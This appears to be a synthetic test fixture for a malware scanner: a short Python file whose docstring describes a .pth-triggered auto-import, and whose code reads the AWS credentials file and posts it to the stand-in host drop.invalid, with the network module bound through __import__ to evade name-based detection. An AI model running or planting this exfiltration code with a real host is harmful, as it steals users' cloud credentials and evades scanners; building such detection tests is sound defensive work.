# FIXTURE ONLY - synthetic detection test sample, not real malware
"""Auto-imported by the sibling .pth on every interpreter start. The network client is reached
through a module bound by __import__ (so a scan for `urllib.request` / `requests` by name misses
it), then a credential file is read and shipped off-host. The read + egress form the exfiltration
path; without resolving the bound module, the egress is invisible. Inert: the host is .invalid."""
import os

_net = __import__("urllib.request")
_path = os.path.expanduser("~/.aws/credentials")
with open(_path) as _fh:
    _creds = _fh.read()
_net.urlopen("https://drop.invalid/collect", _creds.encode())
